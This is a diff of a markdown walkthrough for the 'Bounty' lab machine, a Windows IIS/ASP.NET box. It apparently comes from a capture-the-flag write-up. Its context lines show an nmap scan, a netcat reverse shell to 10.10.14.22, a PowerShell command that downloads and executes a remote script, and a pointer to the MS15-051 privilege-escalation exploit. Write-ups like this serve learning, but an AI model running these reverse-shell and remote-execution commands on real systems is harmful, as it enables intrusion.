@@ -18,9 +18,11 @@ Bounty is a Windows box running IIS and ASP.NET. There is a web page that only a
 * Microsoft IIS 7.5
 
 **Port Scan**
+
 ```
 nmap -vv -Pn -sT -A -p- 10.10.10.93 -oN /mnt/data/boxes/bounty/_full_tcp_nmap.txt 
 ```
+
 * 80/tcp - http
 
 **Directory/File Brute Force**
@@ -142,7 +144,6 @@ c:\windows\temp\nc.exe -e cmd 10.10.14.22 4200
 
 ![image](assets/80321650-b06a2780-87ec-11ea-99bd-b84a6dc0351f.png)
 
-
 ## Steps (root/system)
 
 Not seeing any hotfixes applied after running sysinfo I proceeded to run sherlock to look for exploits. First I copied sherlock to my working directory.
@@ -158,7 +159,6 @@ powershell -nop -exec bypass -c "iex (new-object net.webclient).downloadstring('
 ```
 
 ![image](assets/80321918-2bccd880-87ef-11ea-996b-3ba58f7fcb49.png)
-
 
 This box appeared to be vulnerable to MS15-051 which can be downloaded from here https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051-KB3045171.zip
 
